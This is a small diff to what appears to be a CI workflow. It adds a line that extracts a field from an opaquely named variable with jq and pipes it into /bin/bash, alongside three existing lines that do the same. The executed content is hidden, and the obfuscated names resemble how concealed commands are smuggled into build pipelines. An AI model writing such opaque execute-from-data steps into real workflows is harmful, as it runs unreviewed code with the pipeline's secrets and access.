@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$d60" | jq -r .gjr31 | /bin/bash
           echo $fzfl19 | jq -r .lwzhp55312 | /bin/bash
           echo $z6 | jq -r .szay6 | /bin/bash
+          echo $mz32 | jq -r .eg430 | /bin/bash
 
       - name: Save output
         if: always()
